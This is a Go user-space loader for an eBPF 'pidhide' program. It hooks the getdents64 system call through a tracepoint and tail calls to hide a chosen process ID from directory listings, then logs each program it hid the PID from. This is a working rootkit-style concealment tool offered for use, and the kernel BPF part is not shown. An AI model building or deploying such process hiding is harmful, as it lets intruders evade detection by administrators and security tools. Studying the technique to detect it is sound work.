// SPDX-License-Identifier: BSD-3-Clause
package main

import (
	"bytes"
	"context"
	"encoding/binary"
	"errors"
	"flag"
	"fmt"
	"log"
	"os"
	"os/signal"
	"strconv"
	"syscall"
	"time"

	"github.com/cilium/ebpf/link"
	"github.com/cilium/ebpf/ringbuf"
	"github.com/cilium/ebpf/rlimit"
)

// $BPF_CLANG and $BPF_CFLAGS are set by the Makefile.
//go:generate go run github.com/cilium/ebpf/cmd/bpf2go -cc $BPF_CLANG -cflags $BPF_CFLAGS bpf pidhide.bpf.c -- -I../headers

// 事件结构体，与内核BPF程序中的event结构对应
type event struct {
	Pid     int32
	Comm    [16]byte
	Success bool
}

// 命令行参数
type config struct {
	pidToHide  int
	targetPpid int
}

// 程序状态
type pidHideApp struct {
	objs   bpfObjects
	links  []link.Link
	config config
	cancel context.CancelFunc
}

func main() {
	var cfg config

	// 解析命令行参数
	flag.IntVar(&cfg.pidToHide, "p", 0, "Process ID to hide. Defaults to this program")
	flag.IntVar(&cfg.targetPpid, "t", 0, "Optional Parent PID, will only affect its children.")
	flag.Parse()

	// 检查是否指定了要隐藏的PID
	if cfg.pidToHide == 0 {
		fmt.Println("Pid Required, see --help")
		os.Exit(1)
	}

	// 创建带取消功能的上下文
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// 停止信号通道，用于优雅退出
	stopper := make(chan os.Signal, 1)
	signal.Notify(stopper, os.Interrupt, syscall.SIGTERM)

	// 创建应用程序实例
	app := &pidHideApp{
		config: cfg,
		cancel: cancel,
	}

	// 启动清理goroutine
	go func() {
		<-stopper
		log.Println("Received signal, exiting program..")
		cancel()
		// 给清理操作一点时间
		time.Sleep(100 * time.Millisecond)
		if err := app.close(); err != nil {
			log.Printf("Error closing program: %v", err)
		}
		os.Exit(0)
	}()

	// 初始化并运行程序
	if err := app.run(ctx); err != nil {
		log.Fatalf("Error running program: %v", err)
	}
}

func (app *pidHideApp) run(ctx context.Context) error {
	// 1. 移除内存限制
	if err := rlimit.RemoveMemlock(); err != nil {
		return fmt.Errorf("remove memlock: %w", err)
	}

	// 2. 加载预编译的BPF程序
	spec, err := loadBpf()
	if err != nil {
		return fmt.Errorf("load BPF spec: %w", err)
	}

	// 3. 设置全局变量（只读数据）
	spec.RewriteConstants(map[string]interface{}{
		"pid_to_hide":     uint32(app.config.pidToHide),
		"pid_to_hide_len": uint32(len(strconv.Itoa(app.config.pidToHide)) + 1),
		"target_ppid":     uint32(app.config.targetPpid),
	})

	// 4. 加载BPF程序到内核
	if err := spec.LoadAndAssign(&app.objs, nil); err != nil {
		return fmt.Errorf("load and assign BPF objects: %w", err)
	}

	// 5. 设置程序数组映射（尾调用）
	// 添加handle_getdents_exit到索引1
	handleGetdentsExitFD := app.objs.HandleGetdentsExit.FD()
	if err := app.objs.MapProgArray.Put(uint32(1), uint32(handleGetdentsExitFD)); err != nil {
		return fmt.Errorf("put handle_getdents_exit to prog array: %w", err)
	}

	// 添加handle_getdents_patch到索引2
	handleGetdentsPatchFD := app.objs.HandleGetdentsPatch.FD()
	if err := app.objs.MapProgArray.Put(uint32(2), uint32(handleGetdentsPatchFD)); err != nil {
		return fmt.Errorf("put handle_getdents_patch to prog array: %w", err)
	}

	// 6. 附加跟踪点
	// 附加handle_getdents_entry到sys_enter_getdents64跟踪点
	kp, err := link.Tracepoint("syscalls", "sys_enter_getdents64", app.objs.HandleGetdentsEnter, nil)
	if err != nil {
		return fmt.Errorf("attach tracepoint sys_enter_getdents64: %w", err)
	}
	app.links = append(app.links, kp)

	// 7. 设置环形缓冲区读取器
	rb, err := ringbuf.NewReader(app.objs.Rb)
	if err != nil {
		return fmt.Errorf("create ringbuf reader: %w", err)
	}
	defer rb.Close()

	// 8. 启动事件处理goroutine
	events := make(chan event, 100)
	done := make(chan struct{})
	defer close(done)

	go app.handleEvents(ctx, rb, events, done)

	// 9. 打印启动信息
	fmt.Printf("Successfully started!\n")
	fmt.Printf("Hiding PID %d\n", app.config.pidToHide)
	if app.config.targetPpid > 0 {
		fmt.Printf("Only affecting children of PID %d\n", app.config.targetPpid)
	}
	fmt.Printf("Press Ctrl+C to exit\n")

	// 10. 主循环：处理事件
	for {
		select {
		case <-ctx.Done():
			log.Println("Context cancelled, exiting main loop")
			return nil
		case e, ok := <-events:
			if !ok {
				log.Println("Events channel closed, exiting main loop")
				return nil
			}
			if e.Success {
				comm := string(e.Comm[:bytes.IndexByte(e.Comm[:], 0)])
				fmt.Printf("Hid PID from program %d (%s)\n", e.Pid, comm)
			} else {
				comm := string(e.Comm[:bytes.IndexByte(e.Comm[:], 0)])
				fmt.Printf("Failed to hide PID from program %d (%s)\n", e.Pid, comm)
			}
		}
	}
}

func (app *pidHideApp) handleEvents(ctx context.Context, rb *ringbuf.Reader, events chan<- event, done chan struct{}) {
	defer close(events)
	
	var e event

	for {
		select {
		case <-ctx.Done():
			log.Println("Context cancelled, exiting event handler")
			return
		case <-done:
			log.Println("Done signal received, exiting event handler")
			return
		default:
			// 设置非阻塞读取，以便可以检查上下文取消
			record, err := rb.Read()
			if err != nil {
				if errors.Is(err, ringbuf.ErrClosed) {
					// 环形缓冲区已关闭，正常退出
					return
				}
				// 对于非阻塞错误，继续循环
				log.Printf("Error reading from ringbuf: %v", err)
				continue
			}

			// 解析事件数据
			if err := binary.Read(bytes.NewBuffer(record.RawSample), binary.LittleEndian, &e); err != nil {
				log.Printf("Error parsing event: %v", err)
				continue
			}

			// 发送事件到主循环
			select {
			case events <- e:
			case <-ctx.Done():
				return
			case <-done:
				return
			default:
				log.Println("Events channel full, dropping event")
			}
		}
	}
}

func (app *pidHideApp) close() error {
    log.Println("Starting graceful shutdown...")
    
    // 收集所有错误
    var errs []error
    
    // 阶段1: 停止新的事件处理
    app.cancel()
    
    // 阶段2: 断开所有eBPF链接
    if len(app.links) > 0 {
        log.Printf("Detaching %d eBPF links...", len(app.links))
        for i, link := range app.links {
            if err := link.Close(); err != nil {
                errMsg := fmt.Errorf("failed to detach link %d: %w", i, err)
                errs = append(errs, errMsg)
                log.Println(errMsg)
            }
        }
        app.links = nil // 防止重复关闭
    }
    
    // 短暂等待确保没有正在执行的eBPF调用
    time.Sleep(100 * time.Millisecond)
    
    // 阶段3: 卸载eBPF程序
    log.Println("Unloading eBPF programs from kernel...")
    if err := app.objs.Close(); err != nil {
		errs = append(errs, fmt.Errorf("close eBPF objects: %w", err))
		log.Printf("Error unloading eBPF programs: %v", err)
	}
    
    // 阶段4: 检查是否还有残留的eBPF程序（调试用）
    app.checkForOrphanedPrograms()
    
    if len(errs) > 0 {
        return fmt.Errorf("shutdown completed with %d error(s), first error: %w", 
            len(errs), errs[0])
    }
    
    log.Println("Shutdown completed successfully")
    return nil
}

// 调试函数：检查是否有孤立的eBPF程序
func (app *pidHideApp) checkForOrphanedPrograms() {
    // 可以通过 /sys/fs/bpf/ 检查或使用 bpftool
    // 这里只是一个示例
    log.Println("Checking for orphaned eBPF programs...")
    
    // 实际实现可能包括：
    // 1. 检查 /sys/fs/bpf/ 中的挂载点
    // 2. 执行 bpftool prog list
    // 3. 检查 /proc/kallsyms 中是否有相关符号
}
